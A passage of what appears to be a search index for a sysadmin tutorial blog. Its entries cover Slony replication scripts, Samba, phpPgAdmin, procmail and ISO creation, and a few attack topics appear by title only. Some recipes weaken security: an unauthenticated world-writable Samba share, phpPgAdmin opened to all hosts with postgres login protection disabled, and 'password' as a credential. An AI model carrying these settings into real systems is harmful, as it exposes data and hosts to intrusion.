/etc/slony1/slon_tools.conf deb-node3:/etc/slony1/slon_tools.conf Let’s create what’s needed (as we did above):\ncreateuser -A -D $PGBENCHUSER -h $SLAVE2HOST createuser -s $REPLICATIONUSER -h $SLAVE2HOST psql -d template1 -c \"alter user $PGBENCHUSER with password 'password'\" -h $SLAVE2HOST psql -d template1 -c \"alter user $REPLICATIONUSER with password 'password'\" -h $SLAVE2HOST createdb -O $PGBENCHUSER -h $SLAVE2HOST $SLAVEDBNAME pg_dump -s -U $REPLICATIONUSER -h $MASTERHOST $MASTERDBNAME | psql -U $REPLICATIONUSER -h $SLAVE2HOST $SLAVEDBNAME Then create and execute this script (adapting it to your needs):\n#!/bin/sh slonik \u003c\u003c _END_ # # Define cluster namespace and node connection information # cluster name = $CLUSTERNAME; node 1 admin conninfo = 'dbname=$MASTERDBNAME host=$MASTERHOST port=5434 user=$REPLICATIONUSER'; node 2 admin conninfo = 'dbname=$SLAVEDBNAME host=$SLAVEHOST port=5430 user=$REPLICATIONUSER'; node 3 admin conninfo = 'dbname=$SLAVEDBNAME host=$SLAVE2HOST port=5430 user=$REPLICATIONUSER'; echo 'Cluster defined, nodes identified'; # # Initialize the cluster and create the second node # store node (id=3, comment='Slave2 Node'); # # create paths # store path (server=1, client=3, conninfo='dbname=$MASTERDBNAME host=$MASTERHOST port=5434 user=$REPLICATIONUSER'); store path (server=2, client=3, conninfo='dbname=$MASTERDBNAME host=$SLAVEHOST port=5430 user=$REPLICATIONUSER'); store path (server=3, client=1, conninfo='dbname=$SLAVEDBNAME host=$SLAVE2HOST port=5430 user=$REPLICATIONUSER'); store path (server=3, client=2, conninfo='dbname=$SLAVEDBNAME host=$SLAVE2HOST port=5430 user=$REPLICATIONUSER'); # # Enable listening along each path # store listen (origin=1, receiver=3, provider=1); store listen (origin=3, receiver=1, provider=3); store listen (origin=2, receiver=3, provider=1); store listen (origin=3, receiver=2, provider=1); _END_ Now, we can start the Slon synchronization:\nslon $CLUSTERNAME \"dbname=$SLAVEDBNAME host=$SLAVE2HOST port=5430 user=$REPLICATIONUSER\" \u0026 # Run on the 3rd node Replication should now be operating. Create another script:\n#!/bin/sh slonik \u003c\u003c _END_ # # Define cluster namespace and node connection information # cluster name = $CLUSTERNAME; node 1 admin conninfo = 'dbname=$MASTERDBNAME host=$MASTERHOST port=5434 user=$REPLICATIONUSER'; node 2 admin conninfo = 'dbname=$MASTERDBNAME host=$SLAVEHOST port=5430 user=$REPLICATIONUSER'; node 3 admin conninfo = 'dbname=$SLAVEDBNAME host=$SLAVE2HOST port=5430 user=$REPLICATIONUSER'; subscribe set (id=1, provider=1, receiver=3, forward=yes); _END_ The data verification is ensured at this point!\nHigh Availability linkPromoting a Replica link Promoting the replica is useful when you have multiple nodes to perform maintenance on the Master, for example.\nIn this example, node 1 is the origin of set 1, sending set 1 information to node 2. When you add the 3rd node, you register it to set table 1. The set table is then sent to both other nodes.\nNow the goal is to change the master. So node 3 gets information from node 2 rather than from node 1.\nNode 3 must obviously have nodes 1 and 2 as masters in the information set. Node 2 then becomes master, because you subscribed node 2 to set table 1, and you also activated it as a forwarder of set table 1.\nFortunately, there is a direct link between nodes 2 and 3 for replication. Once node 1 is ready for reintegration, you need to change node 1’s registration to slave rather than master.\n#! /bin/bash # # varlena Slony Initialization # ============================== slonik \u003c\u003c _END_ cluster name =$CLUSTERNAME; node 1 admin conninfo = 'dbname=$MASTERDBNAME host=$MASTERHOST port=5434 user=$REPLICATIONUSER'; node 2 admin conninfo = 'dbname=$SLAVEDBNAME host=$SLAVEHOST port=5430 user=$REPLICATIONUSER'; node 3 admin conninfo = 'dbname=$SLAVEDBNAME host=$SLAVE2HOST port=5430 user=$REPLICATIONUSER'; # ============================== store listen (origin=3, receiver=2, provider=3); store listen (origin=2, receiver=3, provider=2); subscribe set ( id=1, provider=2, receiver=3, forward=yes); _END_ Master Change linkHere, we’ll upgrade the PostgreSQL version of our master. We’ll need to switch our master to another node using the “fast upgrade using master promotion” method.\nBefore deciding to switch the master, you must establish a plan for switching your applications. You’ll likely need to change your PostgreSQL database address, unless you’re using virtual IPs in a cluster environment.\nAnother precaution: work with test database copies before moving to production. Remember that replicas are read-only! And one last thing, back up your databases before any major operations!!!\nEach state in a Slony replication occurs because there’s a new element. Important events are SYNC events, and they are synchronized to each registered node. Logs are also transmitted to nodes that accept forwarding to resynchronize the old master if needed.\nTo change the master set, you must be sure they can replicate properly from the new master. But before switching, sets must be locked from all modifications. Then you can move the set. Finally, the new master must register at the set level.\nWARNING: Before running the script, make sure write permissions on the master database are disabled!!!\n#!/bin/sh slonik \u003c\u003c _EOF_ cluster name = $CLUSTERNAME; node 1 admin conninfo = 'dbname=$MASTERDBNAME host=$MASTERHOST port=5434 user=$REPLICATIONUSER'; node 2 admin conninfo = 'dbname=$SLAVEDBNAME host=$SLAVEHOST port=5430 user=$REPLICATIONUSER'; node 3 admin conninfo = 'dbname=$SLAVEDBNAME host=$SLAVE2HOST port=5430 user=$REPLICATIONUSER'; # add listener paths if required # # lock and move set # lock set (id=1, origin=1); move set (id=1, old origin=1, new origin=2); # subscribe set if required subscribe set (id=1, provider=2, receiver=1, forward=yes); _EOF_ Failover linkFailover cannot be done with Slony alone. You need a Cluster that will manage virtual IPs such as heartbeat 1 or heartbeat 2 for the more adventurous.\nWhen configuring the cluster, assign a virtual IP and the init script. Here’s what you need to promote a slave to master:\n#!/bin/sh slonik \u003c\u003c_EOF_ cluster name = $CLUSTERNAME; node 1 admin conninfo = 'dbname=$MASTERDBNAME host=$MASTERHOST port=5434 user=$REPLICATIONUSER'; node 2 admin conninfo = 'dbname=$SLAVEDBNAME host=$SLAVEHOST port=5430 user=$REPLICATIONUSER'; node 3 admin conninfo = 'dbname=$SLAVEDBNAME host=$SLAVE2HOST port=5430 user=$REPLICATIONUSER'; failover (id=2, backup node = 1); _EOF_ Reference linkDocumentation Building and configuration of Slony\nDocumentation Introducing Slony\nDocumentation on integration of Slony with PostgreSQL\n"
            }
        );
    index.add(
            {
                id:  741 ,
                href: "\/Connaitre_sa_version_du_Bios_sans_rebooter\/",
                title: "How to Check BIOS Version Without Rebooting",
                description: "A simple method to check your system's BIOS version from Linux without having to reboot",
                content: "Sometimes when you have old machines, you might want to know if flashing the BIOS would allow you to use a larger disk. From a remote system, the following command (run as root) will give you plenty of information:\ndd if=/dev/mem bs=32k skip=31 count=1 | strings -n 8 | grep -i bios 1+0 records in 1+0 records out 32768 bytes transferred in 0.011551 seconds (2836813 bytes/sec) Award SoftwareIBM COMPATIBLE 486 BIOS COPYRIGHT Award Software Inc.oftware Inc. Aw Award Modular BIOS v4.51PG Explanation linkOn an x86 system, the BIOS is traditionally accessible in the last 64KB of the first MB of memory. The dd command is instructed to read from RAM starting at the first byte, skipping 31 blocks of 32KB each, and displaying the 32nd block.\nThis tip was found on comp.os.linux.misc (from marcello).\nAnother example looking at the last 32KB of the first MB of memory:\nsudo dd if=/dev/mem bs=32k skip=30 count=1 | strings -n 8 | grep -i bios 1+0 records read 1+0 records written 32768 bytes (33 kB) copied, 0.000149 seconds, 220 MB/s Phoenix cME FirstBIOS Notebook Pro "
            }
        );
    index.add(
            {
                id:  742 ,
                href: "\/Load_Balancing_avec_Apache_2\/",
                title: "Load Balancing with Apache 2",
                description: "How to set up load balancing with Apache 2 web servers, including proxy balancer module and clustering configuration.",
                content: "Here is an effective way to create Load Balancing with several Apache servers:\nLoad Balancer Proxy Documentation for Apache\nAnd here is another documentation on setting up an Apache Server Cluster:\nDocumentation on Setting up a Web Server with Apache, LVS and Heartbeat 2\n"
            }
        );
    index.add(
            {
                id:  743 ,
                href: "\/Installation_et_configuration_de_Samba_en_mode_%22Share%22\/",
                title: "Installation and Configuration of Samba in \"Share\" Mode",
                description: "Learn how to install and configure Samba in Share mode, a simple way to share folders without authentication requirements.",
                content: "Introduction linkSamba is an open source software licensed under the GPL that supports the SMB/CIFS protocol. This protocol is used by Microsoft for sharing various resources (files, printers, etc.) between computers running Windows. Samba allows Unix systems to access resources from these systems and vice versa.\nPreviously, PCs equipped with DOS and early versions of Windows sometimes had to install a TCP/IP stack and a set of Unix-originated software: NFS client, FTP, telnet, lpr, etc. This was heavy and penalizing for PCs of that time, and it also forced users to adopt a double set of habits, adding those of UNIX to those of Windows. Samba takes the opposite approach.\nIts name comes from the file and print sharing protocol from IBM reused by Microsoft called SMB (Server message block), to which the two vowels “a” were added: “SaMBa”.\nSamba was originally developed by Andrew Tridgell in 1991, and today receives contributions from about twenty developers from around the world under his coordination. He gave it this name by choosing a name close to SMB by querying a Unix dictionary with the command grep: grep \"^s.*m.*b\" /usr/dict/words\nWhen both file sharing systems (NFS, Samba) are installed for comparison, Samba proves less efficient than NFS in terms of transfer rates.\nNevertheless, a study has shown that Samba 3 was up to 2.5 times faster than the SMB implementation of Windows Server 2003. See the information on LinuxFr.\nHowever, Samba is not compatible with IPv6.\nThe “Share” mode allows simple folder sharing. No login or password needed, everyone has access to everything, which is not a secure solution, but it’s a simple one.\nInstallation linkTo install Samba:\napt-get install samba Configuration linkBefore you start, define a directory that you want to share (example: /home/share):\nmkdir /home/share chmod 777 /home/share We give it full permissions.\nTo configure Samba, edit the file /etc/samba/smb.conf:\n#======================= Global Settings ===================================== [global] server string = Samba # Samba server name socket options = TCP_NODELAY SO_RCVBUF=8192 SO_SNDBUF=8192 # Socket optimization workgroup = workgroup # Workgroup name os level = 20 # Samba server level ## Encoding ## European display with accents dos charset = 850 display charset = UTF8 ## Name resolution ## Name resolutions dns proxy = no wins support = no name resolve order = lmhosts host wins bcast ## Logs ## max log size = 50 log file = /var/log/samba/%m.log syslog only = no syslog = 0 panic action = /usr/share/samba/panic-action %d ## Passwords ## password server = None # No password server in share mode security = SHARE # Chosen mode invalid users = root # Do not authorize these users. ## Restrictions ## hide special files = no # Hide special files hide unreadable = no # Hide unreadable files hide dot files = no # Hide hidden files (starting with a \".\") ## Resolve office save problems ## oplocks = no # Resolves compatibility issues with versions \u003e MS Office 2002 #======================= Shares ============================================== # tmp share [tmp] comment = Temporary file space path = /tmp read only = no public = yes # share share [share] comment = Share file space path = /home/share read only = no public = yes Some explanations:\nFirst configure the data in Global Set the OS level \u003c 20 unless it acts as a domain controller, then \u003e 50 Adapt all this to your configuration. Then restart Samba:\n/etc/init.d/samba restart Connection linkWindows linkTo connect from Windows, in a link window, type this:\n\\\\IP_of_samba_server\\Share_name You will access the share directly.\nUnix (Linux/Mac…) linkYou must have smbfs installed before continuing:\napt-get install smbfs Then, just create a folder and mount the share inside:\nmkdir test mount -t cifs -o username=nobody,password=nobody //192.168.0.1/tmp ./test Resources linkDocumentation on a Complete auto discovery and mounting solution with SMB shares\n"
            }
        );
    index.add(
            {
                id:  744 ,
                href: "\/AutoFsck_:_Changer_les_checks_filesystem_sur_Ubuntu\/",
                title: "AutoFsck: Changing Filesystem Checks on Ubuntu",
                description: "Learn how to modify filesystem check behavior in Ubuntu using AutoFsck to make them run during shutdown instead of boot time.",
                content: "If you’ve used Ubuntu Linux for longer than a month, you’ve no doubt realized that every 30 times you boot up you are forced to run a filesystem check. This filesystem check is necessary in order to keep your filesystem healthy. Some people advise turning the check off completely, but that is generally not a recommended solution. Another solution is to increase the number of maximum mounts from 30 to some larger number like 100. That way it’s about 3 times less annoying. But this solution is also not recommended. Enter AutoFsck.\nAutoFsck is a set of scripts that replaces the file system check script that comes shipped with Ubuntu. The difference is that AutoFsck doesn’t ruin your day if you are so unfortunate to encounter the 30th mount. The most important difference is that AutoFsck does its dirty work when you shut your computer down, not during boot when you need your computer the most!\nThe 30th time you mount your filesystem, AutoFsck will wait until you shut down your computer. It will then ask you if it is convenient for you to check your filesystem. If it is convenient for you, then AutoFsck will restart your computer, automatically execute the filesystem check, and then immediately power down your system. If it is not convenient for you to check your filesystem at that moment, then AutoFsck will wait until the next time you shut down your computer to ask you again. Being prompted for a file system check during shutdown is infinitely more convenient than being forced to sit through a 15 minute check during boot up.\nhttps://wiki.ubuntu.com/AutoFsck\n"
            }
        );
    index.add(
            {
                id:  745 ,
                href: "\/Motd_:_Modification_du_message_d\u0027ouverture_de_console\/",
                title: "MOTD: Modifying the Console Opening Message",
                description: "Learn how to customize your console opening message (MOTD) using various utilities like cowsay, boxes, linuxlogo, and figlet.",
                content: "Don’t like your console opening message? I’ll show you how to change it. The file is located at:\n/etc/motd\nThere are plenty of small utilities that can create drawings and other interesting displays:\nCowsay linkAllows you to put text in a small drawing (by default a cow, but other drawings are available):\nsudo apt-get install cowsay Example:\necho Serveur Toto|cowsay -f eyes ls /usr/share/cowsay/cows Boxes linkAllows you to place text in small drawings (mainly for adding comments in code lines):\nsudo apt-get install boxes Example:\necho Acces on this server is stricly restricted | boxes -d peek LinuxLogo linkLets you use colorized Linux banners:\nsudo apt-get install linuxlogo Example:\nlinux_logo FIGlet linkAllows you to write text in ASCII art form:\nsudo apt-get install figlet Example:\nfiglet -f small Access Restricted showfigfonts|more Disabling MOTD in SSH linkIf you no longer want any messages when booting via SSH, this command is enough:\ntouch ~/.hushlogin "
            }
        );
    index.add(
            {
                id:  746 ,
                href: "\/Qemu_:_Installation_de_Windows\/",
                title: "QEMU: Windows Installation",
                description: "Guide to installing and running Windows operating systems in QEMU virtual machines.",
                content: "QEMU allows you to run one or more operating systems (and their applications) in isolation on the same physical machine. QEMU works on x86, x86-64, PPC, Sparc, and ARM platforms. QEMU runs under Linux, FreeBSD, OpenBSD, Mac OS X, Unix, and Windows operating systems.\nQEMU is a free, reliable, and powerful virtualization tool. Guest operating systems share the resources of the physical machine.\nQEMU is a “system emulator” or “virtual machine.” Guest operating systems are not “aware” of the underlying QEMU - they don’t need to be “ported” (adapted) to work on QEMU.\nThe Linux kernel module KQEMU (for Kernel QEMU) accelerates emulation on Linux operating systems.\nQEMU Documentation\nQEMU Documentation for OpenBSD\n"
            }
        );
    index.add(
            {
                id:  747 ,
                href: "\/IPv6_:_Suppression_compl%C3%A8te,_IPv4_seulement\/",
                title: "IPv6: Complete Removal, IPv4 Only on Debian",
                description: "How to completely disable IPv6 support and run with IPv4 only on a Debian system.",
                content: "Introduction linkWhen installing a new Debian 4.0 distribution, IPv6 support is enabled by default. This can cause some problems or even simply slow down your system. Indeed, all applications will use IPv6 support for name resolution before or after trying with IPv4.\nMethod 1 linkThis is the case for mplayer used to read an audio or video stream:\n[...] Resolving live.radio-gresivaudan.org for AF_INET6... Couldn't resolve name for AF_INET6: live.radio-gresivaudan.org Resolving live.radio-gresivaudan.org for AF_INET... Connecting to server live.radio-gresivaudan.org[217.117.157.190]: 8000... [...] There is a simple method to disable IPv6 support. You just need to prevent the system from loading the corresponding module. Edit the file /etc/modprobe.d/blacklist and add the line:\nblacklist ipv6 Then edit your /etc/hosts file to remove IPv6 entries.\nMethod 2 linkAnother solution (less elegant in my opinion) is to modify /etc/modprobe.d/aliases from:\nalias net-pf-10 ipv6 to:\nalias net-pf-10 off alias ipv6 off You just need to restart the system (this is not strictly necessary, it is possible to do otherwise, but it is much simpler, especially after an installation). A quick ifconfig will confirm that IPv6 is no longer managed (no more inet6 addr:).\n"
            }
        );
    index.add(
            {
                id:  748 ,
                href: "\/Windows_XP_:_Probl%C3%A8mes_lors_d%27un_d%C3%A9passement_m%C3%A9moire\/",
                title: "Windows XP: Memory Overflow Problems",
                description: "How to solve memory overflow problems in Windows XP by editing registry settings",
                content: "Memory Overflow Problems linkIf you encounter a memory overflow problem that prevents you from launching any application, you need to use “regedit” and edit this registry path:\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SubSystems The “Windows” value contains a long line. You’ll find a part that looks like this:\nSharedSection=xxxx,yyyy,zzzz Edit the yyyy section and increase it as shown in this example:\nWindows SharedSection=1024,3072,512 Modified line:\nWindows SharedSection=1024,8192,512 Here, we’re increasing the GDI memory (the application that manages windows) from 3MB to 8MB.\n"
            }
        );
    index.add(
            {
                id:  749 ,
                href: "\/Cr%C3%A9er_un_DVD_RedHat_%C3%A0_partir_des_CD\/",
                title: "Creating a RedHat DVD from CDs",
                description: "Guide for creating a bootable RedHat DVD from CD images",
                content: "Introduction linkAs of this writing, the current RHEL release (5) is only available on CDs, not DVD. It is possible to create a bootable DVD ISO from these CDs using Chris Kloiber’s mkdvdiso.sh script.\nMethod 1 linkScript mkdvdiso.sh linkInsert this in a mkdvdiso.sh file:\n#!/bin/bash # by Chris Kloiber # A quick hack that will create a bootable DVD iso of a Red Hat Linux # Distribution. Feed it either a directory containing the downloaded # iso files of a distribution, or point it at a directory containing # the \"RedHat\", \"isolinux\", and \"images\" directories. # This version only works with \"isolinux\" based Red Hat Linux versions. # Lots of disk space required to work, 3X the distribution size at least. # GPL version 2 applies. No warranties, yadda, yadda. Have fun. if [ $# -lt 2 ]; then echo \"Usage: `basename $0` source /destination/DVD.iso\" echo \"\" echo \" The 'source' can be either a directory containing a single\" echo \" set of isos, or an exploded tree like an ftp site.\" exit 1 fi cleanup() { [ ${LOOP:=/tmp/loop} = \"/\" ] \u0026\u0026 echo \"LOOP mount point = /, dying!\" \u0026\u0026 exit [ -d $LOOP ] \u0026\u0026 rm -rf $LOOP [ ${DVD:=~/mkrhdvd} = \"/\" ] \u0026\u0026 echo \"DVD data location is /, dying!\" \u0026\u0026 exit [ -d $DVD ] \u0026\u0026 rm -rf $DVD } cleanup mkdir -p $LOOP mkdir -p $DVD if [ !`ls $1/*.iso 2\u003e\u00261\u003e/dev/null ; echo $?` ]; then echo \"Found ISO CD images...\" CDS=`expr 0` DISKS=\"1\" for f in `ls $1/*.iso`; do mount -o loop $f $LOOP cp -av $LOOP/* $DVD if [ -f $LOOP/.discinfo ]; then cp -av $LOOP/.discinfo $DVD CDS=`expr $CDS + 1` if [ $CDS != 1 ] ; then DISKS=`echo ${DISKS},${CDS}` fi fi umount $LOOP done if [ -e $DVD/.discinfo ]; then awk '{ if ( NR == 4 ) { print disks } else { print ; } }' disks=\"$DISKS\" $DVD/.discinfo \u003e $DVD/.discinfo.new mv $DVD/.discinfo.new $DVD/.discinfo fi else echo \"Found FTP-like tree...\" cp -av $1/* $DVD [ -e $1/.discinfo ] \u0026\u0026 cp -av $1/.discinfo $DVD fi rm -rf $DVD/isolinux/boot.cat find $DVD -name TRANS.TBL | xargs rm -f cd $DVD mkisofs -J -R -v -T -o $2 -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table . /usr/lib/anaconda-runtime/implantisomd5 --force $2 cleanup echo \"\" echo \"Process Complete!\" echo \"\" Install the anaconda-runtime linkPrerequisite package and its dependencies:\nyum -y install anaconda-run || timerpm -q anaconda-runtime Make DVD linkPlace the CD ISO files and mkdvdiso.sh in a directory, and run the mkdvdiso.sh script.\nchmod 755 ./mkdvdiso.sh \u0026\u0026 ./mkdvdiso.sh The following command creates a RHEL bootable DVD ISO:\n./mkdvdiso.sh . $(pwd)/RedHat-dvd.iso The file .discinfo should look like:\n1170972069.396645 Red Hat Enterprise Linux Server 5 i386 1,2,3,4,5 Server/base Server/RPMS Server/pixmaps Method 2 linkCreate folders:\nmkdir /mnt/cd{1,2,3,4,5} Mount every iso image with:\nmount -o loop cd1.iso /mnt/cd1 Copy the minimum:\ncp -a cd1/isolinux cd1/.discinfo . Edit the .discinfo and replace 1 with:\n1,2,3,4,5 Do this for all your CDs. Then:\nmkisofs -o redhat.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -R -m TRANS.TBL -x \\ /mnt/cd1/.discinfo -x /mnt/cd1/isolinux -graft-points /mnt/cd1 .discinfo=.discinfo isolinux/=isolinux RedHat/=/mnt/cd2/RedHat RedHat/=/mnt/cd3/RedHat \\ RedHat/=/mnt/cd4/RedHat RedHat/=/mnt/cd5/RedHat Adapt this for your specific needs.\n"
            }
        );
    index.add(
            {
                id:  750 ,
                href: "\/Cr%C3%A9er_une_image_ISO\/",
                title: "Creating an ISO Image",
                description: "Methods for creating ISO images in Linux using simple commands like cat and dd.",
                content: "Introduction linkCreating an ISO image in Windows can be somewhat tedious in some cases (e.g., bootable CDs, etc.). In Linux, one might think it would be complicated, but it’s actually very simple.\nMethod using cat linkThe easiest method:\ncat /dev/hda \u003e ~/image.iso hda: corresponds to your CD device (using /dev/cdrom should also work)\nMethod using dd linkHere’s another method that’s not much more complicated:\ndd if=/dev/cdrom of=winxp.iso And if you want compression afterward:\ndd if=/dev/ad0 bs=8192 | gzip \u003e my_image_file.dd.gz "
            }
        );
    index.add(
            {
                id:  751 ,
                href: "\/WSUS_:_faire_gagner_de_l%27espace_disque_%28purge_des_mises_%C3%A0_jour_inutilis%C3%A9es%29\/",
                title: "WSUS: Save Disk Space (Purge Unused Updates)",
                description: "How to free up disk space on a WSUS server by purging unused Windows updates using WSUSDebug tool.",
                content: "To save space on your WSUS server, you can purge unused updates. There’s no need to keep old updates that are no longer useful.\nFor this, you need to use the “WSUSDebug” tool (available here for direct download or here).\nDownload and install it in “C:\\Windows”. Then open the command prompt and type:\nWsusDebugTool.exe /Tool:PurgeUnneededFiles wsusutil.exe deleteunneededrevisions WSUSUTIL.exe Reset WSUSUTIL.exe Removeinactiveapprovals "
            }
        );
    index.add(
            {
                id:  752 ,
                href: "\/PhpPgAdmin_:_Installation_et_configuration\/",
                title: "PhpPgAdmin: Installation and Configuration",
                description: "Learn how to install and configure PhpPgAdmin to manage PostgreSQL databases through a web interface, including multi-server setup.",
                content: "Introduction linkPhpPgAdmin is equivalent to phpMyAdmin for those who know it. It allows you to administer PostgreSQL through a small web interface.\nInstallation linkTo install it:\napt-get install phppgadmin Then, to choose which web server to run on (otherwise we have to do it manually):\ndpkg-reconfigure phppgadmin Configuration linkTo allow connections from an external machine, modify the file /etc/phppgadmin/apache.conf and add:\nallow from all This is not the ideal configuration; it’s better to add only your IP:\nallow from 192.168.0.2 This is a bit better, but may not necessarily meet your needs.\nNow restart Apache:\n/etc/init.d/apache2 restart For security reasons, the “postgres” login is not allowed to access the database via “phppgadmin”. To allow it, you need to modify the file /etc/phppgadmin/config.inc.php. In this file, set “false” on the following line:\n$conf['extra_login_security'] = false You also need to add the local IP address on the following line:\n$conf['servers'][0]['host'] = '127.0.0.1'; Multi-Server linkIn a multi-server configuration, here are the lines to add:\n$conf['servers'][1]['desc'] = 'Server2'; // Don't forget to change the number (1) to indicate the server, then the server name to display $conf['servers'][1]['host'] = '192.168.0.87'; // The IP of the server $conf['servers'][1]['port'] = 5432; $conf['servers'][1]['sslmode'] = 'allow'; $conf['servers'][1]['defaultdb'] = 'template1'; $conf['servers'][1]['pg_dump_path'] = '/usr/bin/pg_dump'; $conf['servers'][1]['pg_dumpall_path'] = '/usr/bin/pg_dumpall'; $conf['servers'][1]['slony_support'] = false; $conf['servers'][1]['slony_sql'] = '/usr/share/postgresql'; $conf['servers'][2]['desc'] = 'Server3'; $conf['servers'][2]['host'] = '192.168.0.89'; $conf['servers'][2]['port'] = 5432; $conf['servers'][2]['sslmode'] = 'allow'; $conf['servers'][2]['defaultdb'] = 'template1'; $conf['servers'][2]['pg_dump_path'] = '/usr/bin/pg_dump'; $conf['servers'][2]['pg_dumpall_path'] = '/usr/bin/pg_dumpall'; $conf['servers'][2]['slony_support'] = false; $conf['servers'][2]['slony_sql'] = '/usr/share/postgresql'; "
            }
        );
    index.add(
            {
                id:  753 ,
                href: "\/Connaitre_son_architecture\/",
                title: "How to Determine Your System Architecture",
                description: "A simple command to check your system's architecture and CPU capabilities",
                content: "Here’s a simple but very useful trick. The isainfo command allows you to determine the architecture of a machine:\n$ isainfo -v 64-bit amd64 applications pause sse2 sse fxsr amd_3dnowx amd_3dnow amd_mmx mmx cmov amd_sysc cx8 tsc fpu 32-bit i386 applications pause sse2 sse fxsr amd_3dnowx amd_3dnow amd_mmx mmx cmov amd_sysc cx8 tsc fpu I can see here that my system is 64-bit and also has compatibility for 32-bit applications.\n"
            }
        );
    index.add(
            {
                id:  754 ,
                href: "\/Procmail_:_Filtrer_ses_mails_%C3%A0_la_source\/",
                title: "Procmail: Filtering emails at the source",
                description: "How to use Procmail to filter and sort emails directly at source level on Linux systems.",
                content: "Introduction linkProcmail is a very powerful program used to filter emails. With it, you can redirect your mail, sort it, or even protect yourself against spam.\nTo give instructions to procmail, you need to create a file named .procmailrc in your home directory.\nInstallation and configuration linkTo install procmail, as usual:\napt-get install procmail Then, for documentation, I recommend the following: Procmail Documentation\nFollow that with my small example and you should be able to do what you want :-)\nExample link ######## # Vars # ######## VERBOSE=ON DROPPRIVS=YES SHELL=/bin/sh PATH=/usr/local/bin:/usr/bin:/bin MAILDIR=$HOME/Maildir/ DEFAULT=$MAILDIR/new LOGFILE=/var/log/procmail.log # Personal Filters SPAMBOX=$MAILDIR/.Trash/cur # Here I indicate the folder for read mails CRONDIR=$MAILDIR/.Infos_Serveurs.Crontabs/cur MLDKDIR=$MAILDIR/.Infos_Serveurs.Mldonkey/new # new corresponds to new mails MSSBAK=$MAILDIR/.MySecureShell.Sauvegardes/cur MYBAK=$MAILDIR/.Infos_Serveur.Backups/cur UGC=$MAILDIR/.Sur_la_toile.UGC/new EBAY=$MAILDIR/.Sur_la_toile.Ebay/new # Newsletters WEBPLANETE=$MAILDIR/.News.Webplanete/new ZEROUNNET=$MAILDIR/.News.01net/new CLUBIC=$MAILDIR/.News.Clubic/new SILICON=$MAILDIR/.News.Silicon/new PRESENCEPC=$MAILDIR/.News.PresencePC/new FRSIRT=$MAILDIR/.News.FrSIRT/new SECUOBS=$MAILDIR/.News.SecuObs/new :0fw * \u003c 256000 | /usr/bin/spamc -f :0e { EXITCODE=$? } #################### # Personal Filters # #################### # Spam to SPAMBOX :0 * ^Subject:.*****SPAM***** # Subject starting with *****SPAM***** is sent to $SPAMBOX $SPAMBOX # Crontabs :0 * ^Subject:.Cron $CRONDIR :0 * ^From:.root # Sender containing root is sent to the crontab folder $CRONDIR :0 * ^From:.arpwatch $CRONDIR :0 * ^From:.nagios@deimos.fr $CRONDIR # Mldonkey :0 * ^From:.mldonkey $MLDKDIR # MSS Backup :0 * ^Subject:.(MSSBackup*|MySQL*) # Here emails containing MSSBackup or MySQL are sent to $MSSBAK $MSSBAK # UGC :0 * ^From:.*ugc.fr $UGC # Ebay + Paypal :0 * ^From:(.*eBay.*|.*paypal.*) $EBAY #### Newsletters #### :0 * ^Subject:.*WebPlanete.net* $WEBPLANETE :0 * ^From:.*01net $ZEROUNNET :0 * ^From:.*clubic $CLUBIC :0 * ^From:.*Silicon.fr $SILICON :0 * ^Subject:.*Presence PC $PRESENCEPC :0 * ^From:.*FrSIRT $FRSIRT :0 * ^From:.\"Secuobs.com\"* $SECUOBS "
            }
        );
    index.add(
            {
                id:  755 ,
                href: "\/Man_In_The_Middle\/",
                title: "Man in the Middle",
                description: "Documentation about Man in the Middle attack techniques",
                content: "Man In The Middle\n"
            }
        );
    index.add(
            {
                id:  756 ,
                href: "\/Reverse_Engineering_avec_LD_PRELOAD\/",
                title: "Reverse Engineering with LD_PRELOAD",
                description: "A comprehensive guide to reverse engineering using LD_PRELOAD",
                content: "Reverse Engineering with LD_PRELOAD\n"
            }
        );
    index.add(
            {
                id:  757 ,
                href: "\/arp-spoofing-dans-un-reseau-switche\/",
                title: "ARP Spoofing in a Switched Network",
                description: "Information about ARP spoofing techniques in a switched network environment and how to implement these techniques.",
                content: "ARP Spoofing in a Switched Network\n"
            }
        );
    index.add(
            {
                id:  758 ,
                href: "\/alteration-de-tables-arp\/",
                title: "Altering ARP Tables",
                description: "Documentation about ARP tables alteration techniques in network environments",
                content: "Altering ARP Tables\n"
            }
        );
    index.add(
            {
                id:  759 ,
                href: "\/Injection_et_ex%C3%A9cution_de_code_arbitraire_dans_l%5C%27espace_m%C3%A9moire_d%5C%27un_autre_processus\/",
                title: "Arbitrary Code Injection and Execution in Another Process Memory Space",
                description: "How to inject and execute arbitrary code in the memory space of another process",
                content: "Arbitrary Code Injection and Execution in Another Process Memory Space\n"
            }
        );
    index.add(
            {
                id:  760 ,
                href: "\/La_Technique_de_l%5C%27Attaque_Shatter\/",
                title: "Shatter Attack Technique",
                description: "Information about the Shatter Attack technique, a security vulnerability in Windows systems.",
                content: "Shatter Attack Technique\n"
            }
        );
    index.add(
            {
                id:  761 ,
                href: "\/Fuzzing_-_Tutoriel_sur_l\u0027utilisation_et_la_personnalisation_d\u0027un_Fuzzer_pour_la_recherche_de_failles\/",
                title: "Fuzzing - Tutorial on Using and Customizing a Fuzzer for Vulnerability Research",
                description: "Learn how to use and customize a fuzzer for vulnerability research",
                content: "Fuzzing - Tutorial on Using and Customizing a Fuzzer for Vulnerability Research\n"
            }
        );
    index.add(
            {
                id:  762 ,
                href: "\/Download_and_Execute_ShellCode_:_Code_optimis%C3%A9_et_d%C3%A9taill%C3%A9_d%5C%27un_ShellCode_Download\/Execute_pour_Windows\/",
                title: "Download and Execute ShellCode: Optimized and Detailed Code of a Download/Execute ShellCode for Windows",
                description: "Detailed documentation about optimized download and execute shellcode for Windows systems",
                content: "Download and Execute ShellCode: Optimized and Detailed Code of a Download/Execute ShellCode for Windows\n"
            }
        );
    index.add(
            {
                id:  763 ,
                href: "\/Trouver_l%27adresse_de_base_de_kernel32.dll_:_Trois_m%C3%A9thodes_PEB,_SEH_et_TopStack\/",
                title: "Finding the base address of kernel32.dll: Three methods PEB, SEH and TopStack",
                description: "Tutorial describing three different methods to find the base address of kernel32.dll in Windows: PEB, SEH and TopStack methods.",
                content: "Finding the base address of kernel32.dll: Three methods PEB, SEH and TopStack\n"
            }
        );
    index.add(
            {
                id:  764 ,
                href: "\/Netcat_:_Sauvegarde_de_partions_%C3%A0_distance\/",
                title: "Netcat: Remote Partition Backup",
